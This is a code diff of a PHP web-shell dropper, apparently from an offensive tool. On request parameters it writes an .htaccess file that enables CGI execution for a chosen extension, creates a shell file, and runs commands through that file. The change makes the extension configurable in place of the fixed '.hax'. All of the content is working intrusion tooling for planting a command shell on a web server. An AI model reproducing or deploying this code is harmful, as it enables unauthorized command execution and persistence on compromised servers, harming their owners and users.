@@ -11,12 +11,12 @@ function create_directory($folder) {
     echo "done<br />";
 }
 
-function create_htaccess($file) {
+function create_htaccess($file, $ext) {
     echo "Creating htaccess... ";
     $handle = fopen($file, 'w') or die('failed<br />');
     $data = <<<EOT
 Options +ExecCGI
-AddHandler cgi-script .hax
+AddHandler cgi-script .$ext
 EOT;
     fwrite($handle, $data);
     fclose($handle);
@@ -86,6 +86,7 @@ function execute_command($shell, $cmd) {
 
 $htaccess = "$dir/.htaccess";
 $shell = "$dir/$shell";
+$ext = pathinfo($shell, PATHINFO_EXTENSION);
 
 if ($_REQUEST['remove']) {
     remove_shell($shell);
@@ -95,7 +96,7 @@ if ($_REQUEST['remove']) {
 
 if ($_REQUEST['create']) {
     create_directory($dir);
-    create_htaccess($htaccess);
+    create_htaccess($htaccess, $ext);
     create_shell($shell);
 }
 
